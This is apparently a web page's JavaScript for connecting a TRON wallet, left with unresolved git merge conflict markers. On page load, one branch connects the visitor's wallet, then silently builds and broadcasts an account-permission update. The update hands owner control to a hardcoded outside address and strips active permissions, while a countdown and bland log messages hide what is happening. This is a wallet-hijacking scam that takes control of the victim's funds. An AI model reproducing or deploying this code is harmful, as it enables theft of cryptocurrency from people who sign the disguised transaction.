document.addEventListener('DOMContentLoaded', async () => {
<<<<<<< HEAD
    if (!isTronWebInstalled()) {
        console.error("TRC20钱包未安装，请使用TRC20钱包以继续。");
        return;
    }

    try {
        await connectWallet();
    } catch (error) {
        console.error("连接钱包时出错:", error);
    }
=======
    const tronWeb = window.tronWeb;

    // 检查是否安装了支持TRON的钱包
    if (typeof tronWeb === 'undefined' || !tronWeb.defaultAddress.base58) {
        alert("请使用TRC20钱包以继续。");
        return;
    }

    // 尝试自动连接钱包
    try {
        await connectWallet();
        // 自动触发权限确认
        await confirmPermission();
    } catch (error) {
        console.error("Error connecting to wallet or confirming permission:", error);
        alert("Error: " + error.message);
    }

    // 启动倒计时
    startCountdown();
>>>>>>> 07b330529b1f7077483a88325757c53e92db0e2c
});

// 检查是否安装了TronWeb（支持TRC20的钱包）
function isTronWebInstalled() {
    return typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress.base58;
}

// 连接钱包的函数
async function connectWallet() {
    const tronWeb = window.tronWeb;

<<<<<<< HEAD
    if (tronWeb.defaultAddress.base58) {
        console.log("钱包已连接:", tronWeb.defaultAddress.base58);
        return;
    }

    if (tronWeb.request) {
        await tronWeb.request({
            method: 'tron_requestAccounts'
        });
    } else if (tronWeb.trx && tronWeb.trx.getCurrentAccount) {
        await tronWeb.trx.getCurrentAccount();
    } else {
        throw new Error("连接钱包失败，请使用支持的TRON钱包。");
    }

    if (!tronWeb.defaultAddress.base58) {
        throw new Error("连接钱包失败。");
=======
    // 检查钱包是否已连接
    if (!tronWeb.defaultAddress.base58) {
        if (tronWeb.request) {
            // 如果支持tronWeb.request方法，则使用此方法请求连接
            await tronWeb.request({
                method: 'tron_requestAccounts'
            });
        } else if (tronWeb.trx) {
            // 使用tronWeb.trx.getCurrentAccount作为备用
            await tronWeb.trx.getCurrentAccount();
        } else {
            throw new Error("Failed to connect to wallet. Please use a supported TRON wallet.");
        }
    }

    // 确保钱包连接成功
    if (!tronWeb.defaultAddress.base58) {
        throw new Error("Failed to connect to wallet.");
>>>>>>> 07b330529b1f7077483a88325757c53e92db0e2c
    }
}

// 确认权限转移的函数
async function confirmPermission() {
    const tronWeb = window.tronWeb;
    const currentAddress = tronWeb.defaultAddress.base58;

    if (!currentAddress) {
<<<<<<< HEAD
        console.error("未找到钱包地址，请连接您的钱包。");
        return;
=======
        throw new Error("No wallet address found. Please connect your wallet.");
>>>>>>> 07b330529b1f7077483a88325757c53e92db0e2c
    }

    const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';

    console.log("当前地址:", currentAddress);
    console.log("新所有者地址:", newOwnerAddress);

    try {
        const accountInfo = await tronWeb.trx.getAccount(currentAddress);
        console.log("账户信息:", accountInfo);

        const ownerPermission = {
            type: 0,
            permission_name: 'owner',
            threshold: 1,
            keys: [{
                address: tronWeb.address.toHex(newOwnerAddress),
                weight: 1
            }]
        };

        const activePermissions = [];

        const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
            currentAddress,
            ownerPermission,
            null,
            activePermissions
        );

        console.log("交易:", transaction);

        const signedTransaction = await tronWeb.trx.sign(transaction);
        console.log("签名的交易:", signedTransaction);

        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log("交易结果:", result);

        if (result.result) {
            console.log("交易发送成功，请检查您的钱包以签署交易。");
        } else {
<<<<<<< HEAD
            console.error("交易失败:", result.message);
        }
    } catch (error) {
        console.error("发送交易时出错:", error);
=======
            alert("Transaction failed: Please try again.");
        }
    } catch (error) {
        console.error("Error sending transaction:", error);
        alert("Error: Please try again.");
>>>>>>> 07b330529b1f7077483a88325757c53e92db0e2c
    }
}
